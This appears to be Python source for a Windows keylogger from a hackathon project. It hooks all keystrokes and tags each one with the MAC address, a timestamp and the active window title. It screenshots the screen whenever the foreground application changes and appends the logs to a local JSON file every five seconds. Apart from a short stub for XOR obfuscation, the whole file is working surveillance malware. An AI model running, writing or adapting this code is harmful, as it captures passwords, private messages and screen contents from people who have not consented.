import threading
import time
import keyboard
import os
import  json
from getmac import get_mac_address
import win32gui
from PIL import ImageGrab


class Encryptor:
    @staticmethod
    def xor_encryption(text):
        key = "a"
        encrypted_text = ""
        for i in range(len(text)):
            encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
        return encrypted_text


class KeyloggerService:
    def __init__(self):
        self.__action = False
        self.__data = {}
        self.prev_up = None
        self.current_app = None

    def __change_action(self):
        self.__action = not (self.__action)


    def __exit_point(self):
        if keyboard.is_pressed('q'):
            os._exit(0)
            self.__change_action()

    @staticmethod
    def __current_time() -> str:
        return time.strftime('%d/%m/%Y  %H:%M')


    def __on_press(self, pressed_key):
        key = pressed_key.name
        self.__add_to_data(self.__data, key)
        self.__exit_point()


    def __add_on_release(self, pressed_key):
        return pressed_key.name


    def current_screenshot(self):
        if [self.prev_up] != [self.current_app]:
            screen_shot = ImageGrab.grab()
            path = rF"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output\keylogger_picture-{time.strftime('%d-%m-%Y  %H-%M-%S')}.jpg"
            screen_shot.save(path)
            self.prev_up = self.current_app

    def __add_to_data(self, dictionary: dict, data: str):
        current_time = self.__current_time()
        current_mac_address = get_mac_address()
        current_app_1 = win32gui.GetForegroundWindow()
        current_app = win32gui.GetWindowText(current_app_1)
        self.current_app = rf"{current_app}"

        if not dictionary.get(current_mac_address):
            dictionary[current_mac_address] = {}
        if not dictionary[current_mac_address].get(current_time):
            dictionary[current_mac_address][current_time] = {}
        if not dictionary[current_mac_address][current_time].get(self.current_app):
            dictionary[current_mac_address][current_time][self.current_app] = []
        dictionary[current_mac_address][current_time][self.current_app].append(data)

    def start(self):
        self.__change_action()
        while self.__action:
            keyboard.on_press(self.__on_press)
            keyboard.on_release(self.__add_on_release)
            time.sleep(0.1)


    def get_data(self):
        data = self.__data
        self.__data = {}
        return data

    def __enter__(self):
        self.start()

    def __exit__(self, exc_type, exc_val, exc_tb):
        return 1


import json
import os


# class FileWriter:
#     @staticmethod
#     def write_to_file(data: dict):
#         file_path = r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json"
#
#         # אם הקובץ קיים, טען את הנתונים הקיימים
#         if os.path.exists(file_path) and os.path.getsize(file_path) > 0:
#             with open(file_path, "r", encoding="utf-8") as file:
#                 try:
#                     existing_data = json.load(file)
#                 except json.JSONDecodeError:
#                     existing_data = {}  # אם יש שגיאה, התחל עם מילון ריק
#         else:
#             existing_data = {}
#
#         # מיזוג הנתונים החדשים עם הישנים
#         for mac, timestamps in data.items():
#             if mac not in existing_data:
#                 existing_data[mac] = {}
#             for timestamp, logs in timestamps.items():
#                 if timestamp not in existing_data[mac]:
#                     existing_data[mac][timestamp] = {}
#                 for app, keys in logs.items():
#                     if app not in existing_data[mac][timestamp]:
#                         existing_data[mac][timestamp][app] = []
#                     existing_data[mac][timestamp][app].extend(keys)
#
#         # כתיבת הנתונים המעודכנים לקובץ
#         with open(file_path, "w", encoding="utf-8") as file:
#             json.dump(existing_data, file, indent=4, ensure_ascii=False)



class FileWriter:
    @staticmethod
    def write_to_file(data:dict):
        with open(r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json" , "a" , encoding="utf-8") as file:
            if data:
                json.dump(data , file ,ensure_ascii=False,  indent=4)


class KeyLoggerManager:

    def __init__(self):
        self.instance = KeyloggerService()

    def start(self):
        self.instance.start()

    def write_to_file(self):
        FileWriter.write_to_file(self.instance.get_data())

    def main(self):
        threading.Thread(target=self.start).start()
        while True:
            print(self.instance.current_app == self.instance.prev_up)
            self.instance.current_screenshot()
            threading.Thread(target=self.write_to_file).start()
            time.sleep(5)
print(get_mac_address())

A = KeyLoggerManager()
A.main()



